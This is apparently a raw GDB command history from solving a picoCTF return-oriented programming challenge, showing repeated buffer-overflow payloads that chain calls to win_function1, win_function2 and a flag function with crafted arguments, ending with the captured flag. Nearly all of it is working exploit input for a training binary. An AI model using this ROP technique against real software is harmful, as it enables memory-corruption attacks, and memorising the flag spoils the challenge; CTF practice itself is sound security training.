run
file rop
run <<< $(python -c "print 'A'*16")
break *vuln
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH")
c
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'")
c
print system
print win_function1
print win_function
print win_function1
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x80'")
c
print win_function1
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x08'")
c
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x8'")
c
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x08'")
ni
print win_function2
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xd8\x85\x04\x08'")
c
print win_function2
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x08\xd8\x85\x04\x08'")

print win_function1
print win_function2
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = 'xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2")
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = 'xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2")
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = 'xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2")
c
run <<< $(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x08\xd8\x85\x04\x08'")
c
$(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG\xcb\x85\x04\x08\xd8\x85\x04\x08'")
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2")
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'BAAAAAAD'")
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'BAAAAAAD'")
break win_function2
c
ni
x/x $ebp+0x8
x/x $ebp
x/a $ebp
x/a $ebp+0x8
x/a ($ebp+0x8)
x/8x $ebp
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'ZYWXBBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'BAAAAAAD'")
c
x/8x $ebp
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'MNOPQRTS'")
c
x/8x $ebp
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'AAAA\xad\xaa\xaa\xba'")
c
x/8x $ebp
ni
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'AAAA\xad\xaa\xaa\xba'")
c
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'AAAA'+arg1")
c
c
print flag
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x85\x04\x08'+arg1")
c
c
break * flag
break *flag
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x85\x04\x08'+arg1")
c
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x85\x04\x08'+arg1")
c
ni
print flag
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1")
c
ni
c
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1")
c
disable 2
c
ni
x/8x $ebp
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xde\xad\xad\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")
c
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xde\xad\xad\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")
c
ni
x/8x $ebp
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xde\xad\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")
c
c
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xde\xad\xba'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")
c
ni
x/8x $ebp
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xba\xad\xde'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")
c
ni
x/8x $ebp
c
print flag
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; func_flag = '\x2b\x86\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xba\xad\xde'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+func_flag+arg1+arg2")pr
c
c
print win_function1
print win_function2
print flag
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xba\xad\xde'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
run <<< $(python -c "func1 = '\xcb\x85\x04\x08'; func2 = '\xd8\x85\x04\x08'; arg1 = '\xad\xaa\xaa\xba'; arg2 = '\xad\xba\xad\xde'; print 'AAAABBBBCCCCDDDDEEEEFFFFGGGG'+func1+func2+'\x2b\x86\x04\x08'+arg1+arg2")picoCTF{rOp_aInT_5o_h4Rd_R1gHt_6e6efe52}
exit
quit
